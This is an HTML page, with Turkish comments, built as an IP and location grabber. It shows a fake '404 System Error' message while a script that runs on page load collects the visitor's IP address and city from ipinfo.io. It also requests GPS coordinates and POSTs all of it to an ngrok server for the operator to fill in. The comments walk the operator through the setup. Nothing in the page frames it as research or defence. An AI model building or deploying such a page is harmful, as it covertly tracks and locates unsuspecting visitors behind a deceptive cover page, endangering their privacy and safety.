<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Yükleniyor...</title>
</head>
<body>
    <script>
        async function catchData() {
            let payload = {
                ip: "Bilinmiyor",
                city: "Bilinmiyor",
                loc: "Bilinmiyor"
            };

            try {
                // 1. Adım: IP ve Şehir Bilgisini Al (ipinfo.io gibi servisler kullanılır)
                const ipResponse = await fetch('https://ipinfo.io/json?token=YOUR_TOKEN_HERE'); 
                // Not: Token almazsan günlük limit düşük olur ama başlangıçta çalışır.
                const ipData = await ipResponse.json();
                
                payload.ip = ipData.ip;
                payload.city = ipData.city + " / " + ipData.region;
                payload.loc = ipData.loc; // Bu IP bazlı yaklaşık konumdur.

                // 2. Adım: Gerçek Konum İzni İste (GPS)
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(async (position) => {
                        payload.loc = `${position.coords.latitude}, ${position.coords.longitude} (Net GPS)`;
                        sendToServer(payload);
                    }, (err) => {
                        // Kullanıcı reddederse IP bilgisiyle devam et
                        sendToServer(payload);
                    });
                } else {
                    sendToServer(payload);
                }

            } catch (error) {
                console.error("Hata:", error);
                sendToServer(payload);
            }
        }

        async function sendToServer(data) {
            // BURASI ÖNEMLİ: ngrok linkini buraya yazman lazım
            // Örn: https://xxxx-xxxx.ngrok-free.app/log
            const serverUrl = 'BURAYA_NGROK_URLSINI_YAZ/log'; 

            await fetch(serverUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
        }

        // Sayfa açılır açılmaz çalıştır
        catchData();
    </script>

    <h1>Sistem Hatası: 404</h1>
    <p>İçerik yüklenirken bir hata oluştu, lütfen bekleyiniz...</p>
</body>
</html>
